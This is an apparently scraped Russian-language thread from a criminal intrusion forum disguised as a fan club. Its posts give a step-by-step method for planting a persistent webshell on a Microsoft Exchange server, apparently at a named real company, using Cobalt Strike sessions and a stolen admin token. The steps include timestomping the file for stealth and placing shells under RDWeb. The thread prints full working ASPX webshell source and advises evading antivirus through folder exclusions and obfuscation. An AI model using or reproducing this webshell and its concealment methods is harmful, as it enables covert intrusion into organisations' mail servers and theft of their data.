@@ -1,0 +1,330 @@
+
+
+    Vampir
+    Новые темы
+    Новые ответы
+
+    Начало
+    Помощь
+    Поиск
+    Профиль
+    Личные сообщения
+    Пользователи
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Persistence »
+    Exchange Webshell
+
+Exchange Webshell
+Alter · 4 · 53
+« предыдущая тема следующая тема »
+
+Страницы: 1
+Alter
+
+    Administrator
+    Member
+    *****
+        28
+        Просмотр профиля Личное сообщение (Оффлайн) 
+
+: Февраля 05, 2021, 11:32:00 am
+Записан
+
+Поиск и заливка вебшелла в Exchange Microsoft
+В кобальте\мсфе берем сессию и пингуем.
+Возьмём пример derigo.us
+
+Почтовый сервер у них mail.derigo.us
+
+Пингуем его из под локалки. Ипак 10.4.205.90
+Локальный сабнет? Да. Значит в локалке и мы можем его модицифировать.
+
+Обуваем токен админа
+
+Снимаем листинг диры c\windows\system32\inetsrv\config::
+
+Код: [Выделить]
+
+Directory of \\10.4.205.90\C$\Windows\system32\inetsrv\config
+28/11/2013 12:08 <DIR> .
+28/11/2013 12:08 <DIR> ..
+30/01/2020 03:50 18,258 administration.config
+30/01/2020 03:50 149,535 applicationHost.config
+28/11/2013 12:08 <DIR> Export
+28/11/2013 12:08 490 redirection.config
+30/01/2020 03:46 <DIR> schema
+
+
+Видим applicationHost.config
+Качаем, открываем, смотрим:
+
+Код: [Выделить]
+
+<application path="/PowerShell" applicationPool="MSExchangePowerShellAppPool">
+                    <virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\PowerShell" />
+                </application>
+                <application path="/owa" applicationPool="MSExchangeOWAAppPool">
+                    <virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\owa" />
+                </application>
+                <application path="/owa/Calendar" applicationPool="MSExchangeOWACalendarAppPool">
+                    <virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\owa" />
+                </application>
+                <application path="/ecp" applicationPool="MSExchangeECPAppPool">
+                    <virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\ecp" />
+                </application>
+                <application path="/Autodiscover" applicationPool="MSExchangeAutodiscoverAppPool">
+                    <virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Autodiscover" />
+                </application>
+                <application path="/Autodiscover/bin" applicationPool="MSExchangeAutodiscoverAppPool">
+                    <virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Autodiscover\bin" />
+                </application>
+                <application path="/Autodiscover/help" applicationPool="MSExchangeAutodiscoverAppPool">
+                    <virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Autodiscover\help" />
+                </application>
+                <application path="/Microsoft-Server-ActiveSync" applicationPool="MSExchangeSyncAppPool">
+                    <virtualDirectory path="/" physicalPath="C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\sync" />
+                </application>
+
+
+Видим ClientAccess / FrontEnd в этих названиях - дира скорее всего именно та что нужна.
+В данном случае это:
+C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\owa
+
+
+Идем туда. Листинг этой диры:
+
+Код: [Выделить]
+
+Volume Serial Number is 40B9-B0CD
+ Directory of \\10.4.205.90\C$\Program Files\Microsoft\Exchange Server\V14\ClientAccess\owa
+
+23/01/2020  03:25    <DIR>          .
+23/01/2020  03:25    <DIR>          ..
+29/11/2013  08:21    <DIR>          14.3.123.3
+29/11/2013  10:43    <DIR>          14.3.158.1
+04/10/2014  05:47    <DIR>          14.3.174.1
+04/10/2014  06:01    <DIR>          14.3.210.2
+25/06/2016  03:02    <DIR>          14.3.294.0
+06/07/2017  02:26    <DIR>          14.3.351.0
+17/08/2017  02:33    <DIR>          14.3.361.1
+08/02/2018  03:19    <DIR>          14.3.382.0
+05/04/2018  06:56    <DIR>          14.3.388.0
+24/05/2018  02:41    <DIR>          14.3.399.0
+25/10/2018  02:30    <DIR>          14.3.415.0
+23/02/2019  18:26    <DIR>          14.3.439.0
+23/01/2020  03:38    <DIR>          14.3.468.0
+14/12/2013  11:49    <DIR>          8.3.327.1
+23/01/2020  03:25    <DIR>          auth
+23/01/2020  03:25    <DIR>          Bin
+26/06/2019  18:43             4,842 casredirect.aspx
+06/02/2013  07:00                42 csdc.gif
+29/11/2013  08:21    <DIR>          Current
+06/02/2013  07:00               853 default.aspx
+06/02/2013  07:00               202 disabled.aspx
+29/11/2013  08:21    <DIR>          forms
+06/02/2013  07:00               102 global.asax
+26/06/2019  18:43             3,447 info.aspx
+26/06/2019  18:43             5,421 languageselection.aspx
+26/06/2019  18:43             1,714 redir.aspx
+06/02/2013  07:00            63,044 SmallIcons.xml
+29/11/2013  08:21    <DIR>          smime
+29/11/2013  08:21    <DIR>          spell
+06/02/2013  07:00             2,008 urlblockederror.aspx
+23/01/2020  03:38           146,681 web.config
+06/02/2013  07:00           137,150 web.config.bak
+26/06/2019  18:43             1,061 WebReadyView.aspx
+26/06/2019  18:43             1,292 WebReadyViewBody.aspx
+26/06/2019  18:43             7,406 WebReadyViewHead.aspx
+06/02/2013  07:00             1,651 WebReadyViewIndicator.aspx
+
+
+Это то что в хоум директории.
+
+Авторизация для пользователя выглядит по урлу вот так
+https://mail.derigo.us/owa/auth/logon.aspx
+
+23/01/2020  03:25    <DIR>          auth
+
+Идём сюда, листинг:
+
+Код: [Выделить]
+
+Directory of \\10.4.205.90\C$\Program Files\Microsoft\Exchange Server\V14\ClientAccess\owa\auth
+23/01/2020  03:25    <DIR>          .
+23/01/2020  03:25    <DIR>          ..
+26/06/2019  18:43             8,363 error.aspx
+06/02/2013  07:00             1,888 error2.aspx
+26/06/2019  18:43             7,226 expiredpassword.aspx
+07/08/2014  00:24            73,392 exppw.dll
+26/06/2019  18:43             6,067 logoff.aspx
+26/06/2019  18:43            13,479 logon.aspx
+15/01/2019  02:00           104,528 owaauth.dll
+
+
+Тестово проливаем 1.txt с 1-2мя байтами.
+
+Смотрим доступность по URL
+https://mail.derigo.us/owa/auth/1.txt
+
+Если всё ок - загружаем наш вебшелл.
+
+Далее тачим его чтоб он был похож на файлы рядом.
+
+Следующий синтаксис
+
+POWERSHELL CODE::
+
+Код: [Выделить]
+
+(Get-Item "D:\Test\log1.txt").CreationTime=("3 August 2019 17:00:00")
+(Get-Item "D:\Test\log1.txt").LastWriteTeim=("3 August 2019 17:00:00")
+
+
+В кобальте так:
+Код: [Выделить]
+
+powershell (Get-Item "\\10.4.205.90\C$\Program Files\Microsoft\Exchange Server\V14\ClientAccess\owa\auth\webshell.aspx").CreationTime=("15 January 2019 02:00:00")
+powershell (Get-Item "\\10.4.205.90\C$\Program Files\Microsoft\Exchange Server\V14\ClientAccess\owa\auth\webshell.aspx").LastWriteTime=("15 January 2019 02:00:00")
+
+
+В дату ставим тач файлов которые рядом в этой дире.
+
+Далее обновляем листинг и убеждаемся что тач у вебшелла поменялся.
+Заходим по
+https://mail.derigo.us/owa/auth/webshell.aspx
+
+Имя *.aspx файла который проливаем меняем раз от разу.
+И убеждаемся, что вебшелл отработал корректно и команды доступны.
+Используем только в крайне случае так как такой закреп считаем "тихим" на случай выпила остальных.
+
+All credits to @rozetka
+« Последнее редактирование: Февраля 05, 2021, 02:45:26 pm от Alter »
+
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+Ответ #1 : Февраля 11, 2021, 02:21:15 pm
+Записан
+
+Аналогично можно положить вебшелл в узел где есть
+RDWeb
+
+Обычно находится на сабдомене remote.domain.com/RDWeb
+
+Находится тут:
+Код: [Выделить]
+
+%windir%\web\rdweb\pages\
+
+
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+Ответ #2 : Февраля 11, 2021, 02:22:47 pm
+Записан
+
+Самый легкий и живучий вебшелл использую такой:
+Код: [Выделить]
+
+<%@ Page Language="VB" Debug="true" %>
+<%@ import Namespace="system.IO" %>
+<%@ import Namespace="System.Diagnostics" %>
+
+<script runat="server">     
+
+Sub RunCmd(Src As Object, E As EventArgs)           
+  Dim myProcess As New Process()           
+  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)           
+  myProcessStartInfo.UseShellExecute = false           
+  myProcessStartInfo.RedirectStandardOutput = true           
+  myProcess.StartInfo = myProcessStartInfo           
+  myProcessStartInfo.Arguments=xcmd.text           
+  myProcess.Start()           
+
+  Dim myStreamReader As StreamReader = myProcess.StandardOutput           
+  Dim myString As String = myStreamReader.Readtoend()           
+  myProcess.Close()           
+  mystring=replace(mystring,"<","&lt;")           
+  mystring=replace(mystring,">","&gt;")           
+  result.text= vbcrlf & "<pre>" & mystring & "</pre>"   
+End Sub
+
+</script>
+
+<html>
+<body>   
+<form runat="server">       
+<p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>       
+<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>       
+<p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>       
+<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>       
+<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>       
+<p><asp:Label id="result" runat="server"></asp:Label>       
+</form>
+</body>
+</html>
+
+
+
+Кроме того!
+
+ESET NOD32 палит вебшелл, если видите его на ексчендже\РДВебе, то попробуйте добавить папку в исключения либо бекдоритесь альтернативно
+Sophos пальнул вебшелл (13.02.2020)
+
+UPD 14 02 2020 >
+Провеяйте вебшеллы в рантайме на dyncheck без инета, какие то палятся вашим авером, какие то нет.
+« Последнее редактирование: Февраля 14, 2021, 06:20:32 pm от Rozetka »
+
+cybercat
+
+    Users
+    Member
+    *
+        3
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+Ответ #3 : Марта 23, 2021, 05:26:14 am
+Записан
+
+Для тех у кого асп вебшелл удаляется\палится авером! обфусцировать можете не только тот что в архиве, убирает детекты
+линка: https://github.com/grCod/poly
+---
+пример команды:
+
+poly.py -c aspx -e rnd -p shells/shell.aspx -j
+---
+
+'-c', = 'Shell code. [ php, asp, aspx ]'
+'-e', = 'Encoding method. [ b64, ord, rnd, rot ]'
+'-p', = 'Path to shell.'
+'-j', = 'Add junk code.'
+
+Страницы: 1
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Persistence »
+    Exchange Webshell
+
+Перейти в:
+ 
++ Быстрый ответ
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Разработанно с от SychO
+
+
